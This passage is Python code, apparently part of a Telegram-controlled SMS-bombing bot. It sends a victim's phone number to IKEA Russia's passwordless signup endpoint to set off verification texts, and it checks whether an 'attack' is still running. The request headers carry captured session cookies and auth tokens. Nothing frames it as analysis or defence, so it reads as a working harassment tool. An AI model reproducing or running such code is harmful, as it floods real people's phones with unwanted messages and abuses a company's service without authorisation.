            'referer': 'https://ru.accounts.ikea.com/login?state=hKFo2SBMZ2YxN2NERGk1TTNfMEw2T1FCUjdFVWlRMlpKSDFoa6FupWxvZ2luo3RpZNkgYk5ocHVMaU9qSXlqOEFndHlEZzAyeDQ1TVJYdERISlqjY2lk2SA3Mm0ycGR5VUFnOXVMaVJTbDRjNGIwYjJ0a1ZpdmhabA&client=72m2pdyUAg9uLiRSl4c4b0b2tkVivhZl&protocol=oauth2&redirect_uri=https^%^3A^%^2F^%^2Fwww.ikea.com^%^2Fru^%^2Fru^%^2Fprofile^%^2Flogin^%^2F&response_type=code&ui_locales=ru-RU&code_chalenge=y7Eh2sPjOb1897a6ITVq1U7FF--ZRFyq4EKmqQPc91Y&code_chalenge_method=S256&scope=openid^%^20profile^%^20email&audience=https^%^3A^%^2F^%^2Fretail.api.ikea.com&registration=^%^7B^%^7D&consumer=OWF&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xNS4wIn0^%^3D&gasid=GA1.2.1361912221.1629469175',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'ak_bmsc=15F69D6D66058607FD572CDE48752B35~000000000000000000000000000000~YAAQNWcQAiQxtZ56AQAAfGDuYwz/TH65byk+X53UAIK5y/4yfxZXEqEIrGU7XjlfeheBdrYE+WPZZDc2vbqBiJwWvGKiRt5r59YakWuSiPp2LeQ7+fdEZVdI+xttP2rMt6QAz5hVWdcZBFzGAUc7Og/mxC1Ys5x+rgCg+7acwDrL/FAdJu6+PJoFeMUxsRwOrJV+bULUiK2DGc6xSovMQP+k4UBh1nHEA4XMPSQKSLQTh7X4RhU0jQNsCbZ+TpEsF17R/epu4qJYtW+7shzHVwE44hHQw9s4LIIp4xiKCjKL+MnoJeruMBZdselfvJFTV6YhFje+RhxS28HsbAI8mOTV4gyjYvtpsgMp3143kN6dWttZ4hfWP8TX7TTn3/vFMZb+DUj2yUz8; bm_sz=240D80C0DEDF6B046B5C322DE80299DC~YAAQNWcQAiUxtZ56AQAAfGDuYwztYVgfSjM99M3bNsRJc7VHUwPl2sx+T6oDTV5otKcGzTlRk2hGiZzElyryVnaj6BdKRXa/muJZw8cQN80WflRSg8h0GWux3KuDQD9DT/wexJcytiI/db+A2drK1Gx0nWcAAWBgFW4VDNpwvO75BXccNOK2Lah1lqVwyZu3AzJ22l+nEP5wI/IF0A4ZkHtTUcJ/1Nx28BRbwMTQQ6aXTQOkc1cx7Ac5XzXpz4Fw5xrhAFp9ALBsgZ4G/mJm1fa5eBmA10thR86g1IKZVbyV~4600369~3752754; localScriptVersion=1629469173081; optimizelyEndUserId=oeu1629469173214r0.31291914794020004; IKEA_RU_PINNED_CHAT=5; cto_bundle=peMKxl9remlUY2NkN24lMkZBNUJNMXJROUJOWmR0emVLbVA2VG1zMGZMMGZoR1dMViUyRlMxc3VDR0Q2JTJGNlRuRm1QNDNNdWZXU0lJRFZHSU5RSXQ3TWRkTXlHS1MzOTRXN2F2bmVWc0h2ak1WeGhRNzVBT1ZySlNHbjhBM21MOGhiek8xeTY5MnpjSWlvcnliUDdCYmhCSm1VNld1cmclM0QlM0Q; tmr_lvid=a4707f74ba742a49cca0a6853ad2e174; tmr_lvidTS=1629469174542; _ga=GA1.2.265769712.1629469175; _gid=GA1.2.1361912221.1629469175; _ym_uid=162946917558058547; _ym_d=1629469175; _gcl_au=1.1.576206624.1629469175; _ym_isad=1; _ym_visorc=b; user_unic_ac_id=85b92014-2acf-42a4-f196-90b1c10225ab; advcake_session=1; _cs_ex=1564655402; _cs_c=1; bm_sv=84923F446D6B17170FFB7BED7C9176BA~yFAfL4WoJboNVSykVIyrR0RnSfzn/auhoF2/FtYfAF1VbyiI6KT+0OXqOxM/3X3lTmhHpB1/s0XH1OtWkiE7VpyT8Sr6TennLV8DPN3eWs59Tmo4A4ufui9IPUSGURrhAUXRFjEf4zvlvItAqdkepQ==; bm_mi=9D5B4FE34200DA4287141E4FE180B4A6~JpqfaM9aYaunMEiMI2UvyOessRfJAKBSqJdar4jpovZiJaFKwfEqQurkFpoPbaFGBHhlRzNJksSmK5P0nGoDq4BqxZIdyjbJZ60XhD3DFBwqYHLyVWMNfp8lhFFWlJeVdB0EDSqRCUQ1OUME+7JuRW6DcP5Mm3zDICdVVyedVKocyejAO6UbhJw71N4wYPN7yJXaAdWg3Zjzc7SlceT1fHQJE4MxWhx5H7qYv/cu3GN1EuFtkcono8GkxjRgGU+hZ3CVSs2Dx/IpiYxnVxLzRI7tPPTfoe/QJ4chBLrVxM+c8DonWjN87m1tThT57cPsyUYpN9IAUFgKs1XTWaAlGg==; did=s^%^3Av0^%^3Aa66b2b80-01c1-11ec-acbe-43bc5c57f208.5bl5TIb9KBrUsJ8HoAt4u7xdSa8m6ew^%^2FkGpWUPoQ^%^2BPg; auth0=s^%^3Av1.gadzZXNzaW9ugqZoYW5kbGXEQKaWkc6-2dIJY8ramY_7GVl3izSP-KRbSn4YhwPeI4SGG0UIrG8WvB0jBLVF_mKiXng5Wdmn4JVC2PJmxRHxW5KmY29va2llg6dleHBpcmVz1_9lU_EAYSOuea5vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.uAguIMkMfFnjYOsEPRD8D2wFOLo9N5PC8nLWnqbB1Sg; did_compat=s^%^3Av0^%^3Aa66b2b80-01c1-11ec-acbe-43bc5c57f208.5bl5TIb9KBrUsJ8HoAt4u7xdSa8m6ew^%^2FkGpWUPoQ^%^2BPg; auth0_compat=s^%^3Av1.gadzZXNzaW9ugqZoYW5kbGXEQKaWkc6-2dIJY8ramY_7GVl3izSP-KRbSn4YhwPeI4SGG0UIrG8WvB0jBLVF_mKiXng5Wdmn4JVC2PJmxRHxW5KmY29va2llg6dleHBpcmVz1_9lU_EAYSOuea5vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.uAguIMkMfFnjYOsEPRD8D2wFOLo9N5PC8nLWnqbB1Sg; RT=^\\^z=1&dm=ikea.com&si=b51c69d6-4aa8-445b-9fac-3748db94141f&ss=kskfvftq&sl=3&tt=6ly&bcn=^%^2F^%^2F1737ad57.akstat.io^%^2F&ld=3te&hd=4su^\\^; tmr_reqNum=12; _abck=295D91AE91617212001B3BBFC678F34E~0~YAAQlQVJF8+WuVd7AQAAGnzuYwY6DjyjXkY8OoM4H86Y4fI6L3BabS1r093fc70vlZoJOY5K+RF9KNGfVTrRd20pmyqDaWAyMk+Ssck3jWbsAuxajyFaboP3InCCikgIDmGfQO4oh/vm1AxlZZmKsQ5iNXKEMNBgtl5e06j4Ue8sibGbLdHlq9/sJhNQDE7DGPhyUl5r9j2kHXi4sG8kSCOQTsU08RaJH057XMDUbZ8gLEnSM6gOWLddkYL2+P/gR98L6Fbk+OTb5Y5QBZu6sfwbCYQTM3orybRZO7L/yXiLMlvFbwI/9XfVD85UiTumXPp57oOONrhn50aFhqXfcEIp89KCoIhLHu62za9Fv2RNLWhV6fhayWuEE6uyp1tDMZ1P/7RHfzmXay5e3Pmk7gCuBEVELZzI2zC2QvhkKjQBtUg=~-1~-1~-1; ui_locales=ru-RU; ak_bmsc=15F69D6D66058607FD572CDE48752B35~000000000000000000000000000000~YAAQlQVJF9yWuVd7AQAA5X7uYwyCGJQjYeBwrQ9ayf9xeZZW/OHys9kSg7M7nHxJPyZV+Iyb76KVF6ZTuAChL/MPODaFLB4N3f5FRWtz5RszcpirwKgg4dFYGASH9Nu7KAHfL+ztEmlPrJEkKLgj0mS6/nj+uZpPj/pShoWp6LXsLHFIUvsx7mYEM6McJ8JbhJAScEWS+mrVytpGoQtmsa8PfkawBqh5LZ136sUuao9u4qswrBjPQWPM/5ccSqTwt9ID2xWl/c7CVKPwbZBQ2xe5dqE+ZWJYsvvVBzVt0XzC+22qX5CT6VWUZDA953gVIQbmyKTnLfRHBJbHLKEdSA6WQRX8J79mM4ycZC9ERt9dvOpIip857T8BjKikaSHDWKgUe6+2yVXNIWXKDvyyOuXMRr0Mas2QH4cm9Ch7; bm_sv=84923F446D6B17170FFB7BED7C9176BA~yFAfL4WoJboNVSykVIyrR0RnSfzn/auhoF2/FtYfAF2TYCFu6X1d+MmHj2DKRwsgDKpF3PUUHWHZj9gNAxle3NhM4diJ0TsELaW8C7GgKYhRNm9ADpIYrHWyQFHbG1IHudUT+GuTLMAHT8XrRiFMTrcqyx5nn69wdksJRXK1gXI=',
        }

        data = '^{^\\^phoneNumber^\\^:^\\^+' + phone + '^\\^,^\\^flow^\\^:^\\^SIGNUP_PHONE_VERIFY^\\^^}'

        response6 = requests.post('https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start', headers=headers, data=data)
        print(response6.status_code, 'ikea')


        if not utilities.is_attack_running(userid):
            bot = telebot.TeleBot(config.bot_token)
            bot.send_message(userid, "СМС остановлены!")
            return 0
